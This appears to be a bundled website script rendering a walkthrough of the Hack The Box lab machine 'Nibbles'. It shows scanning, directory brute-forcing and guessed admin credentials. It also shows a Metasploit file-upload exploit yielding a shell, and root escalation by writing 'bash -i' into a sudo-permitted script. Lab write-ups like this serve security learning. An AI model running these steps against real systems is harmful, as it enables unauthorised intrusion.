(window.webpackJsonp=window.webpackJsonp||[]).push([[85],{425:function(s,t,e){"use strict";e.r(t);var a=e(13),n=Object(a.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"nibbles"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#nibbles"}},[s._v("#")]),s._v(" Nibbles")]),s._v(" "),t("p",[s._v("Address: "),t("code",[s._v("10.10.10.75")])]),s._v(" "),t("h2",{attrs:{id:"initial-scan"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#initial-scan"}},[s._v("#")]),s._v(" Initial scan")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("nmap "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-A")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-T5")]),s._v(" -p- "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.75\n")])])]),t("h3",{attrs:{id:"nmap-results"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#nmap-results"}},[s._v("#")]),s._v(" Nmap results")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-10 03:40 EDT\nWarning: 10.10.10.75 giving up on port because retransmission cap hit (2).\nNmap scan report for 10.10.10.75\nHost is up (0.20s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\nAggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.18 (95%), Linux 4.2 (95%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT       ADDRESS\n1   199.01 ms 10.10.14.1\n2   199.09 ms 10.10.10.75\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 228.39 seconds\n")])])]),t("h2",{attrs:{id:"result-analysis"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#result-analysis"}},[s._v("#")]),s._v(" Result analysis")]),s._v(" "),t("p",[s._v("Open port on 80 and 22. Let's try opening the port 80 in a web browser. If that doesn't work we will try the SSH port.")]),s._v(" "),t("h2",{attrs:{id:"port-80-recon"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#port-80-recon"}},[s._v("#")]),s._v(" Port 80 recon")]),s._v(" "),t("p",[s._v("Going into the webpage for port 80, we find that there is only a simple hello world text inside.\nBrowsing the source code however, we see that there is a comment in HTML")]),s._v(" "),t("div",{staticClass:"language-html extra-class"},[t("pre",{pre:!0,attrs:{class:"language-html"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("\x3c!-- /nibbleblog/ directory. Nothing interesting here! --\x3e")]),s._v("\n")])])]),t("p",[s._v("so obviously, we navigate to that subdirectory : "),t("code",[s._v("10.10.10.75:80/nibbleblog")])]),s._v(" "),t("p",[s._v("So far nothing out of the obvious.")]),s._v(" "),t("h2",{attrs:{id:"gobuster"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#gobuster"}},[s._v("#")]),s._v(" Gobuster")]),s._v(" "),t("p",[s._v("Using gobuster on the nibbleblog website:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("gobuster "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" http://10.10.10.75/nibbleblog "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n")])])]),t("p",[s._v("Result:")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("Gobuster v1.4.1              OJ Reeves (@TheColonial)\n=====================================================\n=====================================================\n[+] Mode         : dir\n[+] Url/Domain   : http://10.10.10.75/nibbleblog/\n[+] Threads      : 10\n[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes : 301,302,307,200,204\n=====================================================\n/content (Status: 301)\n/themes (Status: 301)\n/admin (Status: 301)\n/plugins (Status: 301)\n/README (Status: 200)\n/languages (Status: 301)\n=====================================================\n")])])]),t("p",[s._v("From here, we navigate to the admin panel")]),s._v(" "),t("h2",{attrs:{id:"admin-password-cracking"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#admin-password-cracking"}},[s._v("#")]),s._v(" Admin password cracking")]),s._v(" "),t("p",[s._v("Trying simple "),t("code",[s._v("admin")]),s._v(" and "),t("code",[s._v("nibbles")]),s._v(" password combination worked.")]),s._v(" "),t("h2",{attrs:{id:"admin-panel"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#admin-panel"}},[s._v("#")]),s._v(" Admin panel")]),s._v(" "),t("p",[s._v("Looking inside settings, we see that this nibbleblog is running on a vulnerable version of nibbleblog. Let's attempt to do some kind of file upload within the nibbleblog")]),s._v(" "),t("h2",{attrs:{id:"metasploit"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#metasploit"}},[s._v("#")]),s._v(" Metasploit")]),s._v(" "),t("p",[s._v("Using metasploit, we find that there is a nibbleblog module avaialble for use")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("msfconsole\nuse exploit/multi/http/nibbleblog_file_upload\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" PASSWORD nibbles\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" USERNAME admin\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" TARGETURI /nibbleblog/\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" RHOST "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.75\nexploit\n")])])]),t("p",[s._v("And it gave us a meterpreter shell")]),s._v(" "),t("h2",{attrs:{id:"meterpreter"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#meterpreter"}},[s._v("#")]),s._v(" Meterpreter")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("getuid "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# gives us back a nibbler user")]),s._v("\nsysinfo\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Computer    : Nibbles")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Meterpreter : php/linux")]),s._v("\n")])])]),t("h2",{attrs:{id:"priv-esc"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#priv-esc"}},[s._v("#")]),s._v(" Priv Esc")]),s._v(" "),t("p",[s._v("Using the meterpreter shell, let's see which commands we can run as sudo")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Matching Defaults entries for nibbler on Nibbles:")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# User nibbler may run the following commands on Nibbles:")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh")]),s._v("\n")])])]),t("p",[s._v("We see that there's a specific file "),t("code",[s._v("/home/nibbler/personal/stuff/monitor.sh")]),s._v(" that can be run as root")]),s._v(" "),t("p",[s._v("Let's see if that file exists --- And No. It doesn't.")]),s._v(" "),t("p",[s._v("And going into the "),t("code",[s._v("/home/nibbler")]),s._v(" directory, the folder personal doesn't even exist. So instead, let's try creating those folders and a shell script to help us get a root shell")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" personal\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" personal\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" stuff\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" stuff\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"bash -i"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" monitor.sh\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# root")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" /root\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" root.txt\n")])])])])}),[],!1,null,null,null);t.default=n.exports}}]);